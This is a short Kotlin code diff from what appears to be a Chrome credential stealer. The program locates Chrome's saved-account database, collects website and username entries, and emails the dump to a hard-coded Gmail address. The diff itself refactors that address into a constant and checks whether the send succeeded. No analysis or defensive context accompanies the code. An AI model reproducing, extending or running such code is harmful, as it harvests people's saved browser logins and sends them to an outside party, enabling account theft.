@@ -17,6 +17,8 @@ data class ChromeAccount(private val website: String,
 
 private lateinit var databaseFile: File
 private lateinit var connection: Connection
+const val emailToSendTo = "astroazure7@gmail.com"
+
 
 fun main(args: Array<String>) {
     searchChrome()
@@ -24,7 +26,9 @@ fun main(args: Array<String>) {
     val list = getAccounts().filter {
         !it.username.isNullOrBlank()
     }
-    MailTLS.sendDump("astroazure7@gmail.com", list)
+    val emailRes = MailerTLS.sendDump(emailToSendTo, list)
+    if(emailRes)
+        println("Sent ^^")
 }
 
 /**
